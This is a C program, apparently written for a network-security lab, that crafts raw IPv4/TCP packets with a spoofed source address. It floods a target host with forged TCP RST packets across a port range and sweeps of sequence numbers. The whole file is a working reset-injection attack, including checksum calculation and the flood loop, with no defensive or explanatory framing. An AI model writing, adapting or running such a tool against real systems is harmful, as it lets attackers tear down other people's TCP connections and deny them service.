#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define DATAGRAMSIZE 1024 // number of bytes for raw datagram
#define PSEUDOPACKETSIZE 1024 // number of bytes for pseudo packet
#define PAYLOAD ""

uint16_t ip_checksum(void* vdata,size_t length) {
    // Cast the data pointer to one that can be indexed.
    char* data=(char*)vdata;

    // Initialise the accumulator.
    uint32_t acc=0xffff;

    // Handle complete 16-bit blocks.
    for (size_t i=0;i+1<length;i+=2) {
        uint16_t word;
        memcpy(&word,data+i,2);
        acc+=ntohs(word);
        if (acc>0xffff) {
            acc-=0xffff;
        }
    }

    // Handle any partial block at the end of the data.
    if (length&1) {
        uint16_t word=0;
        memcpy(&word,data+length-1,1);
        acc+=ntohs(word);
        if (acc>0xffff) {
            acc-=0xffff;
        }
    }

    // Return the checksum in network byte order.
    return htons(~acc);
}

//Pseudo header needed for calculating the TCP header checksum
struct pshdr {
  uint32_t src_addr;
  uint32_t dst_addr;
  uint8_t reserved;
  uint8_t protocol;
  uint16_t tcp_len;
};

int main(int argc, char *argv[])
{
    int sockfd, total = 0, num, yes = 1;
    char datagram[DATAGRAMSIZE], pseudo_packet[PSEUDOPACKETSIZE], ipstr[INET_ADDRSTRLEN];
    struct sockaddr_in sa;
    struct iphdr *iph;
    struct tcphdr *tcph, *cstcph;
    struct pshdr *psh;
    char *sIP = "10.0.2.2", *dIP = "10.0.2.15";
    uint16_t sport = 35801, dport, port0 = 30000, port_max = USHRT_MAX - 1, win = 8192;
    uint16_t id0 = rand() %(65536);
    uint32_t seq, seq0 = 0, ack0 = 0;
    size_t tcp_len;
    void *data;

    if (argc != 3) {
	    fprintf(stderr,"usage: reset port0 port_max\n");
	    exit(1);
	}

    port0 = (uint16_t) atoi(argv[1]);
    port_max = (uint16_t) atoi(argv[2]);
    if ((port0 >= USHRT_MAX) || (port_max >= USHRT_MAX)) {
        fprintf(stderr,"0 < port0, port_max < %u\n", USHRT_MAX);
	    exit(1);
    }

    // Open raw socket without protocol header
    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("fakesync: socket\n");
        exit(-1);
    }

    // Set option to include protocol header
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &yes, sizeof yes) <0) {
        perror("fakesync: socketopt()\n");
        exit(-1);
    }

    // carve out IP header and TCP header
    memset(datagram, 0, sizeof datagram);
    iph = (struct iphdr *) datagram;
    tcph = (struct tcphdr *) (iph + 1);
    data = (char *) (tcph + 1);
    strcpy(data, PAYLOAD);

    tcp_len = sizeof(struct tcphdr) + strlen(data);

    // pack IP header
    iph -> version = 4; // IPv4
    iph -> ihl = 5; // 5 * 32 bits
    iph -> tos = 0; // DSCP: default; ECN: Not ECN-capable transport
    iph -> tot_len = htons(sizeof(struct iphdr) + tcp_len); // total length
    iph -> id = htons(id0); // start ID
    iph -> frag_off = 0x00;
    iph -> ttl = 64; // time to live
    iph -> protocol = IPPROTO_TCP; // TCP
    iph -> check = 0;
    inet_pton(AF_INET, sIP, &(iph -> saddr));
    inet_pton(AF_INET, dIP, &(iph -> daddr));

    // calculate IP check sum
    iph -> check = ip_checksum((void *) datagram, sizeof(struct iphdr) + tcp_len);
    
    // pack TCP header
    tcph -> source = htons(sport); // source port
    tcph -> dest = 0; // destination port init to 0
    tcph -> seq = 0; // sequence number initially set to 0
    tcph -> ack_seq = 0; // ack sequence number
    tcph -> res1 = 0;
    tcph -> res2 = 0;
    tcph -> doff = 5; // 5 * 32-bit tcp header
    tcph -> urg = 0; // urgent flag
    tcph -> ack = 0;
    tcph -> psh = 0; // push data immediately
    tcph -> rst = 1;
    tcph -> syn = 0;
    tcph -> fin = 0;
    tcph -> window = htons(win); // 16 bits
    tcph -> check = 0; // 16 bits. init to 0.
    tcph -> urg_ptr = 0; // 16 bits. indicates the urgent data, if URG flag is set
    
    // construct psudo packet
    memset(pseudo_packet, 0, sizeof pseudo_packet);
    psh = (struct pshdr *) pseudo_packet;
    cstcph = (struct tcphdr *) (psh + 1);
    memcpy(cstcph, (char *)tcph, tcp_len);

    // pack pseudo header
    inet_pton(AF_INET, sIP, &(psh -> src_addr)); // 32 bit source address
    inet_pton(AF_INET, dIP, &(psh -> dst_addr)); // 32 bit destination address
    psh -> reserved = 0;
    psh -> protocol = IPPROTO_TCP; // TCP
    psh -> tcp_len = htons(tcp_len); // TCP segment length

    // build sockaddr
    sa.sin_family = AF_INET;
    // sa.sin_port = htons(dport);
    inet_pton(AF_INET, dIP, &(sa.sin_addr.s_addr));

    // RST flood loop
    for (dport = port0; dport < port_max; dport++) {
        for (seq = seq0 ; seq < USHRT_MAX - win; seq += win) {
            tcph -> dest = htons(dport);
            cstcph -> dest = htons(dport);
            tcph -> seq = htonl(seq); // set seq number
            cstcph -> seq = htonl(seq); // set seq number in the checksum header
            // tcph -> ack_seq = htonl(ack0++); // set ack seq number
            // cstcph -> ack_seq = htonl(ack0); // set ack seq number in the checksum header
            tcph -> check = 0; // reset check sum
            cstcph -> check = 0; // reset check sum  
            tcph -> check = ip_checksum(pseudo_packet, sizeof(struct pshdr) + tcp_len); // calculate check sum

            if ((num = sendto(sockfd, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
            {
                perror("fakesync: sendto()\n");
            }
            if ((total++) % win == 0) {
                printf( "%d RST packets sent\n", total);
            }
        }
    }
// dport = htons(rand() %(65535+1-1024)+1024); // pick another random destination port

    return 0;
}